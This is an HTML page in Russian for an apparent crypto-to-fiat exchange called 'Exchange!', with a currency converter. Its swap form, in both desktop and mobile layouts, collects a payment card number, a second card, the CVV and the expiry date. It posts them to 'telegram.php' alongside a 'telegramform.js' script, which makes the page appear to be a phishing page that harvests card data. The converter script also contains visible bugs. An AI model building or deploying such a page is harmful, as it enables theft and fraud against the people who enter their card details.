<html>
	<head>
	
	  <link rel="stylesheet" href="Inter/inter.css">
	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="telegramform.js"></script>  
<link rel="stylesheet" href="style.css">
	</head>
	<body>
	
	        <script type="text/javascript">
                c = new Array();
                n = new Array();
                c[0] = 1;
                n[0] = "USD";
                c[1] = 0.95;
                n[1] = "EUR";
                c[2] = 42.35;
                n[2] = "UAH";
				c[3] = 5.05;
                n[3] = "PLN";

 
                function Conv()
                {
                        var res, vfrom, vto, vcash;
                        vcash = document.getElementById("cash").value;
                        if(isNaN())
                        vfrom = document.getElementById("from").value;
                        vcash = vcash.replace(',', '\.');
                        vcash = vcash.replace(' ', '');
                        vcash = vcash.replace(' ', '');
                        vto = document.getElementById("to").value;
                        res = c[vto] * vcash / c[vfrom], 2;
                if(isNaN(res))
                {
                        res = "<span class='result'>0,00</span>";
                }
                else
                {
                        res = res.toFixed(2);
                        res = res.toString();
                        res = res.replace('\.', ',');
                        res = "<span class='result'>" + res + "</span>&nbsp;" + n[vto];
                }
                document.getElementById("result").innerHTML = res;
                }
</script>
  <style>
  @media  screen and (max-width: 720px) {
  .div-pc {
    display: none;
  }
  .div-mobile {
    display: block;
  }
}
@media  screen and (min-width: 720px) {
    .div-pc {
    display: block;
  }
  .div-mobile {
    display: none;
  }
}


  </style> <div class="div-pc">	<div class="parent" >  <!-- style ="position: absolute; width: 70%; height: 18px; left: 300px; top: 40px;" -->
  <div  class="column logo" style="    width: 30%;
  margin-bottom:60px" align="left"><img src="img/logo.png" style="margin-bottom:-15px"    align="left"></div>
    <div width="70%" align="right">
  
    <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="rules.html" class="header" ><a href="indexchange.php" class="header" >Главная</a></p><br><div class="line4"></div></div>
  <div class="column" width="10%" style=" margin-right:60px"align="left"><p style="white-space: nowrap;"><a href="contacts.html" class="header" >Контакты</a></p></div>
	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="rules.html" class="header" >Правила обмена</a></p></div>
	  	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="about.html" class="header" >О нас</a></p></div>
  </div>
  </div>
   
  <table  width="1200px" align="center"><tr width="100%" align="center"><td width="50%" align="left">
<div style="width:50%;	border: 0px solid #FFFFFF; 	position:relative ;
	margin-left: 1%;
    width: 60%;
    table-layout: fixed;
    border-spacing: 10px;
	font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 48px;
line-height: 58px;"align="left">



<p class="texte" style="margin-top:200px;">Быстрый обмен <br>
криптовалюты на фиат
<span style="font-family: 'Inter';
font-style: italic;
font-weight: 500;
font-size: 48px;
line-height: 58px;
color: #EBFF00;"><br>Exchange!</span></p>
<div class="parent1"     style="border-spacing: 50px; margin-left:-40px">
<div  width="40%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br>
USDT на <br>
EUR</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>

<div class="vl column"></div>
<div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br> 
без <br> 
ограничений</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
select
{
	outline: none;
}
input
{
	outline: none;
}

</style>

<div class="vl column"></div><div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br> 
за <br> 
минимальное время</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>


</div></td>
<td width="50%" align="right">

<div align="center" class="paym" style="    height: 820px;">
<div style="margin-top:-10px;
border-bottom:1px solid #191919;"><p align="left" style="font-family: 'Inter';
font-style: normal;
font-weight: 300;
font-size: 18px;
line-height: 22px;
color: #191919;
margin-left:20px;
margin-bottom:8px;
padding: 10px;">Swap</p></div>

<table width="100%"style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:20%;"><img src="img/exch.png" align="left"></td>
<td style="
width:60%;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 600;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;">Депозит</p></td>
<td style="
width:20%;"></td>
</tr>
</table>


<table width="100%" height="30px" style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:25%;"><p class="paymmenu" style="color: #191919;">ДЕТАЛИ</p></td>
<td style="
width:25%;"><p class="paymmenu">ДЕПОЗИТ</p></td>
<td style="
width:25%;"><p class="paymmenu">ОБМЕН</p></td>
<td style="
width:25%;"><p class="paymmenu">ГОТОВО</p></td>
</tr>
</table>


<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-300px;
margin-bottom:2px;
margin-top:2px;">Вы отправляете</p></tr><form method="POST" action="telegram.php">
<tr align="left"><td><input name="cash" id="cash" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="18"></td><td>
				<select name="from" style="margin-left: 9;background: #ECECEC;border-radius: 10px;width: 97px;height: 40px;border-top-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;margin-top: -10;" id="from" onchange='Conv();'>
      <option value="3" selected="selected" data-class="podcast">PLN</option>
      <option value="1" data-class="video">EURO</option>
	  <option value="0" data-class="video">USD</option>
	  <option value="2" data-class="video">UAH</option>
                </select>
				</td></tr></table>
</div>
<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:0px;
padding-bottom:40px">
<table align="left" style="width: 100%;">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-300px;
margin-bottom:2px;
margin-top:2px;">Вы получаете</p></tr>
<tr align="left"><td><div style="width:313px"><span id="result" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;"><span class="result">0,00</span></span></div></td><td>
				<select name="to" align="right" style="background: #ECECEC;border-radius: 10px;width: 100px;height: 40px;border-top-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;margin-top: -10;margin-left: -48px;" id="to" onchange='Conv();'>
                        <option value="2" selected="selected"><img src="usdt.png">UAH</option>
						<option value="3" selected="selected"><img src="usdt.png">PLN</option>
						<option value="1" selected="selected"><img src="usdt.png">EURO</option>
						<option value="0" selected="selected"><img src="usdt.png">USD</option>
                </select>
				</td></tr></table>
</div>

<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: -312px;
margin-bottom:2px;
margin-top:2px;">Номер карты</p></tr>
<tr align="left"><td><input name="code" id="code" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="25"></td><td>

				</td></tr></table>
</div>


<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-140px;
margin-bottom:2px;
margin-top:2px;">Дополнительная карта(не обязательно)</p></tr>  
<tr align="left"><td><input name="card" id="card" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="25"></td><td>

				</td></tr></table>
</div>

<table style ="margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:13px">
<tr>
<td style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	">
<table align="left" >
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: 9px;
margin-bottom:2px;
margin-top:2px;">CVV</p></tr>   
<tr align="left"><td><input name="fio" id="fio" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="10" size="10"></td><td>

				</td></tr></table>
</td>
<td style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	">
<table align="left">
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: 14px;
margin-bottom:2px;
margin-top:2px;">Дата</p></tr>   
<tr align="left"><td><input name="fio" id="fio" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="9" size="9"></td><td>

				</td></tr></table>
</td>
</tr>
</table>








<table>
<tr><td><p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */color: #8C8C8C;
margin-left:-203px;padding-bottom: 5px;">Резерв: <span style="color:#191919;">49800 PLN</span></p></td></tr>
<tr><td><p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */color: #8C8C8C;margin-left:-203px;padding-bottom: 0px;margin-bottom: 0px;">Минимальная сумма: <span style="color:#191919;">
PLN 150</span></p><p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */color: #191919;margin-left: -58px;padding-bottom: 5px;margin-bottom: 0px;margin-top: 0px;">
UAH 1000<br>
EUR 75<br>
USD 75</p></td></tr>
</table>
<a href="indexchange.html">
</a><input style="width: 161px;
width: 424px;
height: 60px;


/* Sun */

background: #D0DF24;
border-radius: 15px;
border:0px;
padding-top:15px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 20px;
line-height: 24px;
text-align: center;

/* 191919 */

color: #191919;" type="submit" name="submit" value="НАЧАТЬ ОБМЕН"></form>




</div></td>

</tr>
</div>
</table>

<div style="height:20%;">
</div>
<footer style="    background-color: #FFFFFF;
    display: block;
    height: 240px;
    position: relative;
    bottom: 0;
    left: 0;
    width: 100%;"><div align="center" style="margin-top:49px;"><table><tr>
	
	<td><div class="line6" ></div></td>
	
	<td><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 15px;
line-height: 18px;
padding-left:12px;
padding-right:12px;
color: #8C8C8C;">НАШИ ПАРТНЕРЫ</p></td>

<td><div class="line6" ></div></td>

</tr></table></div>
<div align="center" style="margin-top:28px;"><img src="img/foot.png"></div>

<div align="center" style="margin-top:82px;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 16px;
line-height: 19px;

/* Gray d */

color: #8C8C8C;">© Copyright © 2022 - All Rights Reserved.</p>
</div>
</footer></div>
































<script>function FuncImages() {
  document.getElementById("main").style.display = "block";
  document.getElementById("click").style.display = "none";
}</script>
<script>function FuncImages1() {
  document.getElementById("click").style.display = "block";
  document.getElementById("main").style.display = "none";
}</script>


<div class="div-mobile">




<img src="img/menuu.png" id = "click" onclick = "FuncImages()" style="position:absolute; top:20px; right:20px;">
<div class="parent"  id="main" style="    border-spacing: unset;    position: absolute;display:none; margin-left: 0%; width:100%;">  <!-- style ="position: absolute; width: 70%; height: 18px; left: 300px; top: 40px;" -->

  <div style="margin-top:20px;" width="100%" align="center">
  
    <div class="column" width="10%" align="left"  style="text-align: center;background: #292929;border-radius: 18px;height: 33px; white-space: nowrap;"><p style="text-align: center;background: #292929;border-radius: 18px;height: 33px; white-space: nowrap;"><a href="indexchange.php" class="header" >Главная</a></p></div>
  <div class="column" width="10%" style=" margin-right:60px"align="left"><p style="white-space: nowrap;"><a href="contacts.html" class="header" >Контакты</a></p><br><div class="line5"></div></div>
	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="rules.html" class="header" >Правила обмена</a></p><br><div class="line3"></div></div>
	  	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="about.html" class="header" >О нас</a></p><br><div class="line2"></div></div>
			  	  <div class="column" width="10%" align="left"><p style="white-space: nowrap;"><a href="responds.html" class="header" >Отзывы</a></p><br><div class="line1" ></div></div>
  </div><img src="img/menuu.png" id = "click1" onclick = "FuncImages1()" style="position:absolute; top:20px; right:20px;">
  </div>








	
     
   
   
   
   


<div style="    width: 100%;
    left: 0;
    overflow: auto;">
<div style="    display: table-cell;
    vertical-align: middle;
    width: 485px;
    left: 50%;
    margin: 0 0 0 -242.5px;">
<p class="texte" style="margin-top:200px;">Быстрый обмен <br>
криптовалюты на фиат
<span style="font-family: 'Inter';
font-style: italic;
font-weight: 500;
font-size: 48px;
line-height: 58px;
color: #EBFF00;"><br>Exchange!</span></p>
<div class="parent1"     style= "    position: inherit;border-spacing: 50px; margin-left:-40px">
<div  width="40%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br>
USDT на <br>
EUR</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>

<div class="vl column"></div>
<div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br> 
без <br> 
ограничений</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
select
{
	outline: none;
}
input
{
	outline: none;
}

</style>

<div class="vl column"></div><div  width="10%" style=" margin-right:60px"align="left" class="column"><p class="header" style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;"><span style="font-family: 'Inter';
font-style: italic;
font-weight: 700;
font-size: 20px;
line-height: 30px;
/* or 150% */


/* Sun 2 */

color: #EBFF00;">Обмен</span><br> 
за <br> 
минимальное время</p></div>
<style>
.vl {
  border-left: 2px solid #EBFF00;
  height: 90px;
}
</style>


</div></td></div></div>
<td width="50%" align="right">
<div width="100%" style="    width: 100%;
    height: 100%;
    left: 0;
    overflow: auto;">








<div align="center" class="paym" style="display: table-cell;
    vertical-align: middle;    height: 820px;
	    position: absolute;
    left: 50%;
    margin: 132 0 0 -242.5px">
<div style="margin-top:-10px;
border-bottom:1px solid #191919;"><p align="left" style="font-family: 'Inter';
font-style: normal;
font-weight: 300;
font-size: 18px;
line-height: 22px;
color: #191919;
margin-left:20px;
margin-bottom:8px;
padding: 10px;">Swap</p></div>

<table width="100%"style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:20%;"><img src="img/exch.png" align="left"></td>
<td style="
width:60%;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 600;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;">Депозит</p></td>
<td style="
width:20%;"></td>
</tr>
</table>


<table width="100%" height="30px" style="margin-left:30px;
margin-right:30px;
margin-top:26px;">
<tr >
<td style="
width:25%;"><p class="paymmenu" style="color: #191919;">ДЕТАЛИ</p></td>
<td style="
width:25%;"><p class="paymmenu">ДЕПОЗИТ</p></td>
<td style="
width:25%;"><p class="paymmenu">ОБМЕН</p></td>
<td style="
width:25%;"><p class="paymmenu">ГОТОВО</p></td>
</tr>
</table>


<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-300px;
margin-bottom:2px;
margin-top:2px;">Вы отправляете</p></tr><form method="POST" action="telegram.php">
<tr align="left"><td><input name="cash" id="cash" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="18"></td><td>
				<select name="from" style="margin-left: -45;background: #ECECEC;border-radius: 10px;width: 136px;height: 40px;border-top-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;margin-top: -10;" id="from" onchange='Conv();'>
      <option value="0" selected="selected" data-class="podcast">PLN</option>
      <option value="1" data-class="video">EURO</option>
	  <option value="2" data-class="video">USD</option>
	  <option value="3" data-class="video">UAH</option>
                </select>
				</td></tr></table>
</div>
<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:0px;
padding-bottom:40px">
<table align="left" style="width: 100%;">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-300px;
margin-bottom:2px;
margin-top:2px;">Вы получаете</p></tr>
<tr align="left"><td><div style="width:313px"><span id="result" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;"><span class="result">0,00</span></span></div></td><td>
				<select name="to" align="right" style="background: #ECECEC;border-radius: 10px;width: 100px;height: 40px;border-top-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;margin-top: -10;margin-left: 0px;" id="to" onchange='Conv();'>
                                                <option value="2" selected="selected"><img src="usdt.png">UAH</option>
						<option value="3" selected="selected"><img src="usdt.png">PLN</option>
						<option value="4" selected="selected"><img src="usdt.png">EURO</option>
						<option value="5" selected="selected"><img src="usdt.png">USD</option>
                </select>
				</td></tr></table>
</div>

<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: -312px;
margin-bottom:2px;
margin-top:2px;">Номер карты</p></tr>
<tr align="left"><td><input name="code" id="code" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="25"></td><td>

				</td></tr></table>
</div>


<div style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	margin-left:30px;
margin-right:30px;
margin-top:26px;
padding-bottom:40px">
<table align="left">
<tr>
<p style="font-family: 'Inter';
font-style: normal;
font-weight: 400;
font-size: 14px;
line-height: 17px;
/* identical to box height */


/* 191919 */

color: #191919;
margin-left:-325px;
margin-bottom:2px;
margin-top:2px;">Дополнительная карта(не обязательно)</p></tr>  
<tr align="left"><td><input name="card" id="card" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="25" size="25"></td><td>

				</td></tr></table>
</div>


<table align="left">
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: 9px;
margin-bottom:2px;
margin-top:2px;">CVV</p></tr>   
<tr align="left"><td><input name="fio" id="fio" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="10" size="10"></td><td>

				</td></tr></table>
</td>
<td style="background: #FFFFFF;
border: 2px solid #DADADA;
border-radius: 15px;	">
<table align="left">
<tr>
<p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */


/* 191919 */color: #191919;margin-left: 14px;
margin-bottom:2px;
margin-top:2px;">Дата</p></tr>   
<tr align="left"><td><input name="fio" id="fio" class="is" type="text" onkeyup='Conv();' align="left" style="
margin-left:3%;
border: 0px;
margin-bottom:2px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 24px;
line-height: 29px;
/* identical to box height */


color: #191919;" maxlength="9" size="9"></td><td>

				</td></tr></table>
</td>
</tr>
</table>







<table>
<tr><td><p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */color: #8C8C8C;
margin-left:-203px;padding-bottom: 5px;">Резерв: <span style="color:#191919;">49800 PLN</span></p></td></tr>
<tr><td><p style="font-family: 'Inter';font-style: normal;font-weight: 400;font-size: 14px;line-height: 17px;
/* identical to box height */color: #8C8C8C;
margin-left:-203px;padding-bottom: 5px;">Минимальная сумма: <span style="color:#191919;">100 PLN</span></p></td></tr>
</table>
<a href="indexchange.html">
</a><input style="width: 161px;
width: 424px;
height: 60px;


/* Sun */

background: #D0DF24;
border-radius: 15px;
border:0px;
padding-top:15px;
font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 20px;
line-height: 24px;
text-align: center;

/* 191919 */

color: #191919;" type="submit" name="submit" value="НАЧАТЬ ОБМЕН"></form>




</div></div></td>

</tr>



<div style="height:20%;">
</div>
<footer style="      margin-top: 300px;  background-color: #FFFFFF;
    display: block;
    height: 240px;
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;"><div align="center" style="margin-top:49px;"><table><tr>
	
	<td><div class="line6" ></div></td>
	
	<td><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 15px;
line-height: 18px;
padding-left:12px;
padding-right:12px;
color: #8C8C8C;">НАШИ ПАРТНЕРЫ</p></td>

<td><div class="line6" ></div></td>

</tr></table></div>
<div align="center" style="margin-top:28px;"><img src="img/foot.png" width="100%"></div>

<div align="center" style="margin-top:82px;"><p style="font-family: 'Inter';
font-style: normal;
font-weight: 500;
font-size: 16px;
line-height: 19px;

/* Gray d */

color: #8C8C8C;">© Copyright © 2022 - All Rights Reserved.</p>
</div>
</footer></div>
	</body>
</html>